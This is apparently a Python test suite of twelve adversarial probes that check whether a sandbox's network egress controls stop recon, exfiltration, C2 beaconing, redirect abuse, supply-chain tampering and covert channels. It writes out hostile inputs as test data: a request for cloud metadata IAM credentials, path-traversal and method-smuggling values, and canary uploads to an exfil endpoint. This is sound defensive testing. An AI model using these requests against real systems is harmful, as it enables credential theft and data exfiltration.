"""The SEP-1 probe suite.

12 probes derived from the Hugging Face forensic action classes (recon, RCE,
dropper, supply-chain, network-pivot). Each declares, BEFORE any run:
  id · class · property_violated_if_success · expected_A · expected_B
so the run can only confirm or refute a prediction, never invent one.

Outcome vocabulary:
  SUCCESS          adversary goal achieved (bytes crossed / destination reached)
  BLOCKED          adversary goal not achieved
  VIOLATION_BLOCKED blocked AND the allowlist monitor recorded a violation
  PARTIAL          partially achieved; carries a measured quantity (bits)

A probe that returns SUCCESS/PARTIAL under Config B is a finding about our own
profile and is reported, not suppressed (the covert_channel probe is designed to
do exactly this).
"""
from __future__ import annotations

import time
import urllib.parse
from dataclasses import dataclass
from typing import Callable

from channel import measure_capacity  # noqa: E402  (same dir on sys.path)


@dataclass
class Probe:
    id: str
    action_class: str
    property_violated_if_success: str
    expected_A: str
    expected_B: str
    run: Callable  # (transport, ctx) -> dict(outcome=..., achieved=bool, detail=..)


# --- individual probe bodies ------------------------------------------------

def _recon(t, ctx):
    r = t.egress("GET", ctx["allowed_host"], ctx["allowed_port"], "/health")
    if r.get("ok"):
        return {"outcome": "SUCCESS", "achieved": True,
                "detail": "reached a live network destination from the sandbox"}
    return {"outcome": "BLOCKED", "achieved": False,
            "detail": r.get("reason", "no network destination reachable")}


def _dropper(t, ctx):
    # Pull attacker-chosen bytes into the sandbox.
    r = t.egress("GET", ctx["allowed_host"], ctx["allowed_port"], "/any?bytes=4096")
    if r.get("ok") and len(r.get("body", b"")) == 4096:
        return {"outcome": "SUCCESS", "achieved": True,
                "detail": "pulled 4096 attacker-controlled bytes into the sandbox"}
    return {"outcome": "BLOCKED", "achieved": False,
            "detail": "could not pull arbitrary bytes"}


def _canary_exfil(t, ctx):
    token = ctx["canary"]
    r = t.egress("POST", ctx["allowed_host"], ctx["allowed_port"],
                 "/exfil", body=token.encode())
    arrived = ctx["harness"].recv_contains(token)
    if r.get("ok") and arrived:
        return {"outcome": "SUCCESS", "achieved": True,
                "detail": "canary reached the (compromised) upstream and was confirmed in its log"}
    return {"outcome": "BLOCKED", "achieved": False,
            "detail": "canary did not cross the boundary"}


def _c2_heartbeat(t, ctx):
    ok = 0
    for _ in range(3):
        r = t.egress("GET", ctx["allowed_host"], ctx["allowed_port"], "/any?bytes=8")
        if r.get("ok"):
            ok += 1
        time.sleep(0.01)
    if ok == 3:
        return {"outcome": "SUCCESS", "achieved": True,
                "detail": "3/3 C2 beacons completed (all in-policy destinations)"}
    return {"outcome": "BLOCKED", "achieved": False, "detail": f"{ok}/3 beacons"}


def _redirect_abuse(t, ctx):
    # Ask the allowed upstream to 302 us to an attacker host.
    url = f"http://{ctx['attacker_host']}:{ctx['attacker_port']}/any?bytes=16"
    r = t.egress("GET", ctx["allowed_host"], ctx["allowed_port"],
                 "/any?redirect=" + urllib.parse.quote(url, safe=""))
    # In A the proxy follows the redirect and reaches the attacker host, though
    # the monitor logged only an in-policy connection to the allowed host.
    if r.get("ok") and r.get("body"):
        return {"outcome": "SUCCESS", "achieved": True,
                "detail": "followed upstream redirect to attacker host; monitor saw only in-policy"}
    if not t.has_network():
        return {"outcome": "BLOCKED", "achieved": False,
                "detail": "no destination is expressible; redirects cannot be requested"}
    return {"outcome": "BLOCKED", "achieved": False, "detail": "redirect not followed"}


def _smuggle_grammar(t, ctx):
    if t.config == "B":
        # Try to smuggle a path/method/header through the fetch fields.
        attempts = [
            {"verb": "fetch", "ecosystem": "pypi", "name": "../../etc/passwd",
             "version": "1.0", "artifact": "wheel"},
            {"verb": "fetch", "ecosystem": "pypi", "name": "requests", "version": "2.31.0",
             "artifact": "wheel", "method": "CONNECT"},
            {"verb": "GET", "ecosystem": "pypi", "name": "requests",
             "version": "2.31.0", "artifact": "wheel"},
        ]
        rejected = 0
        for a in attempts:
            resp = t.fetch_raw(a)
            if not resp.get("ok"):
                rejected += 1
        if rejected == len(attempts):
            return {"outcome": "BLOCKED", "achieved": False,
                    "detail": f"grammar rejected all {rejected} smuggling attempts"}
        return {"outcome": "SUCCESS", "achieved": True,
                "detail": "a non-conforming request was accepted"}
    # Config A: no smuggling needed, arbitrary methods/paths are native.
    r = t.egress("GET", ctx["allowed_host"], ctx["allowed_port"], "/any?path=%2e%2e%2fsecret")
    return {"outcome": "SUCCESS", "achieved": True,
            "detail": "arbitrary path/method is expressible natively (no grammar to smuggle past)"}


def _upload_put(t, ctx):
    token = ctx["canary"] + "-PUT"
    r = t.egress("PUT", ctx["allowed_host"], ctx["allowed_port"], "/exfil", body=token.encode())
    if r.get("ok") and ctx["harness"].recv_contains(token):
        return {"outcome": "SUCCESS", "achieved": True,
                "detail": "PUT upload accepted and stored upstream"}
    return {"outcome": "BLOCKED", "achieved": False, "detail": "no upload verb available"}


def _metadata_service(t, ctx):
    # Reach the cloud instance-metadata service (IMDS) — an OFF-list host.
    r = t.egress("GET", "169.254.169.254", 80, "/latest/meta-data/iam/security-credentials/")
    if r.get("ok"):
        return {"outcome": "SUCCESS", "achieved": True,
                "detail": "reached IMDS (should never happen)"}
    if r.get("blocked") and r.get("status") == 403:
        return {"outcome": "VIOLATION_BLOCKED", "achieved": False,
                "detail": "allowlist blocked off-list IMDS and logged a violation (allowlist working as designed)"}
    return {"outcome": "BLOCKED", "achieved": False,
            "detail": r.get("reason", "IMDS unreachable (no network)")}


def _poisoned_artifact(t, ctx):
    # The compromised upstream tampers with a PINNED package's bytes.
    ctx["harness"].poison_on()
    got_tampered = False
    if t.config == "A":
        r = t.egress("GET", ctx["allowed_host"], ctx["allowed_port"],
                     "/pkg/pypi/requests/2.31.0/wheel")
        got_tampered = r.get("ok") and b"POISONED" in r.get("body", b"")
        outcome = ("SUCCESS", True, "attacker-tampered bytes delivered into sandbox (no pinning)") if got_tampered \
            else ("BLOCKED", False, "tampered bytes not delivered")
    else:
        r = t.fetch("pypi", "requests", "2.31.0", "wheel")
        # Broker must detect digest mismatch and deliver zero bytes.
        outcome = ("BLOCKED", False, f"digest pin held: {r.get('reason')}") if not r.get("ok") \
            else ("SUCCESS", True, "tampered bytes served despite pin (control S5 FAILED)")
    return {"outcome": outcome[0], "achieved": outcome[1], "detail": outcome[2]}


def _lockfile_miss(t, ctx):
    # Request a real-but-UNLISTED package (present upstream, absent from lockfile).
    if t.config == "A":
        r = t.egress("GET", ctx["allowed_host"], ctx["allowed_port"], "/pkg/maven/junit/4.13.2/jar")
        if r.get("ok") and r.get("body"):
            return {"outcome": "SUCCESS", "achieved": True,
                    "detail": "unlisted package delivered (allowlist does not constrain which artifact)"}
        return {"outcome": "BLOCKED", "achieved": False, "detail": "not delivered"}
    r = t.fetch("maven", "junit", "4.13.2", "jar")
    if not r.get("ok"):
        return {"outcome": "BLOCKED", "achieved": False,
                "detail": f"lockfile closure held: {r.get('reason')}"}
    return {"outcome": "SUCCESS", "achieved": True, "detail": "unlisted package served (S4 FAILED)"}


def _covert_channel(t, ctx):
    # Transmit a known secret. Config A: full-duplex POST (effectively
    # unbounded). Config B: only selection/ordering/timing of pinned fetches,
    # measured empirically in bits/hour.
    return measure_capacity(t, ctx)


def _persistence_restart(t, ctx):
    token = ctx["canary"] + "-PERSIST"
    if t.config == "A":
        w = t.egress("PUT", ctx["allowed_host"], ctx["allowed_port"], "/exfil", body=token.encode())
        # simulate restart: state survives because it lives on the upstream
        survived = ctx["harness"].recv_contains(token)
        if w.get("ok") and survived:
            return {"outcome": "SUCCESS", "achieved": True,
                    "detail": "attacker state written to upstream survives sandbox restart"}
        return {"outcome": "BLOCKED", "achieved": False, "detail": "no persistence"}
    # Config B: no writable egress; the sandbox cannot store arbitrary state.
    return {"outcome": "BLOCKED", "achieved": False,
            "detail": "no writable egress; arbitrary state cannot be persisted across restart"}


# --- registry with pre-declared expectations --------------------------------

PROBES: list[Probe] = [
    Probe("recon", "recon", "sandbox reached a network destination",
          "SUCCESS", "BLOCKED", _recon),
    Probe("dropper", "dropper", "attacker-controlled bytes entered the sandbox",
          "SUCCESS", "BLOCKED", _dropper),
    Probe("canary_exfil", "exfil", "a secret left the boundary",
          "SUCCESS", "BLOCKED", _canary_exfil),
    Probe("c2_heartbeat", "network-pivot", "sustained C2 to a destination",
          "SUCCESS", "BLOCKED", _c2_heartbeat),
    Probe("redirect_abuse", "network-pivot", "reached an upstream-chosen destination",
          "SUCCESS", "BLOCKED", _redirect_abuse),
    Probe("smuggle_grammar", "rce", "a non-conforming request was honoured",
          "SUCCESS", "BLOCKED", _smuggle_grammar),
    Probe("upload_put", "exfil", "wrote data to an external store",
          "SUCCESS", "BLOCKED", _upload_put),
    Probe("metadata_service", "network-pivot", "reached the instance metadata service",
          "VIOLATION_BLOCKED", "BLOCKED", _metadata_service),
    Probe("poisoned_artifact", "supply-chain", "attacker-tampered bytes delivered for a pinned name",
          "SUCCESS", "BLOCKED", _poisoned_artifact),
    Probe("lockfile_miss", "supply-chain", "an unlisted artifact was delivered",
          "SUCCESS", "BLOCKED", _lockfile_miss),
    Probe("covert_channel", "exfil", "information crossed via selection/ordering/timing",
          "SUCCESS", "PARTIAL", _covert_channel),
    Probe("persistence_restart", "dropper", "attacker state persisted across restart",
          "SUCCESS", "BLOCKED", _persistence_restart),
]


def suite_manifest() -> list[dict]:
    return [{"id": p.id, "class": p.action_class,
             "property_violated_if_success": p.property_violated_if_success,
             "expected_A": p.expected_A, "expected_B": p.expected_B} for p in PROBES]
